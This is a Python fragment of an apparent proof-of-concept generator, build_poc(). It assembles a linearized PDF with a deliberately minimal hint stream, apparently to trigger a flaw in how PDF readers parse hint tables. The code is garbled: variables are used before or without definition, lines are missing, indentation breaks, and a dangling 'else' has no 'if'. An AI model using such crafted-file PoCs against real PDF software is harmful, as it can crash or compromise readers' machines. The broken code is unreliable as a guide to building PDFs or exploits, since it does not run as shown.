import struct

def build_poc():

    hints_bit_data += struct.pack('>H', 1)       # nBitsOffsetStream
    hints_bit_data += struct.pack('>I', 0)       # lengthStreamLeast
    hints_bit_data += struct.pack('>H', 1)       # nBitsLengthStream
    hints_bit_data += struct.pack('>H', 1)       # nBitsNumShared
    hints_bit_data += struct.pack('>H', 1)       # nBitsShared
    hints_bit_data += struct.pack('>H', 1)       # nBitsNumerator
    hints_bit_data += struct.pack('>H', 1)       # denominator
    hints_bit_data += b'\x80'                    # nObjects[0] bit
    hints_bit_data += b'\x80'                    # pageLength[0] bit

        b'<< /S 0 /Length ' + str(len(hints_bit_data)).encode() + b' >>\n'

    )

    # Build PDF in two passes

    obj3 = b'3 0 obj\n<< /Type /Pages /Kids [2 0 R] /Count 1 >>\nendobj\n'
    obj4 = b'4 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n'

    # First pass: estimate sizes
    # Use a format string with fixed-width fields
    # /L, /T, /H offsets are all at most 5 digits (for files < 100KB)
    # Use 10-digit padding for safety
    obj1_fmt = '1 0 obj\n<< /Linearized 1 /L {file_len:010d} /O 2 /E 100 /N 1 /T {xref:010d} /H [ {hoff:010d} {hlen:010d} ] /P 0 >>\nendobj\n'
    
    # First pass: use zeros

    obj1_start = len(pdf)
    pdf.extend(obj1_pad)

    pdf.extend(obj3)
    obj4_start = len(pdf)
    pdf.extend(obj4)
    hints_start = len(pdf)
    pdf.extend(hints_obj_content)
    xref_start = len(pdf)
    
    # XRef
    num_objects = 6
    xref = f'xref\n0 {num_objects}\n0000000000 65535 f \n'
    xref += f'{obj1_start:010d} 00000 n \n'
    xref += f'{obj2_start:010d} 00000 n \n'
    xref += f'{obj3_start:010d} 00000 n \n'
    xref += f'{obj4_start:010d} 00000 n \n'
    xref += f'{hints_start:010d} 00000 n \n'
    pdf.extend(xref.encode())
    
    # Trailer
    trailer = f'trailer\n<< /Size {num_objects} /Root 4 0 R >>\n'
    pdf.extend(trailer.encode())
    pdf.extend(b'startxref\n')
    pdf.extend(f'{xref_start}\n'.encode())
    pdf.extend(b'%%EOF\n')
    
    file_len = len(pdf)
    
    # Fix obj1 with correct values
    obj1_fixed = obj1_fmt.format(
        file_len=file_len,
        xref=xref_start,
        hoff=hints_start,
        hlen=len(hints_obj_content)
    ).encode()
    
    # Verify same length
    if len(obj1_fixed) != len(obj1_pad):
        print(f"WARNING: obj1_fixed ({len(obj1_fixed)}) != obj1_pad ({len(obj1_pad)})")

        else:
            obj1_fixed = obj1_fixed[:len(obj1_pad)]
    
    pdf[obj1_start:obj1_start+len(obj1_pad)] = obj1_fixed
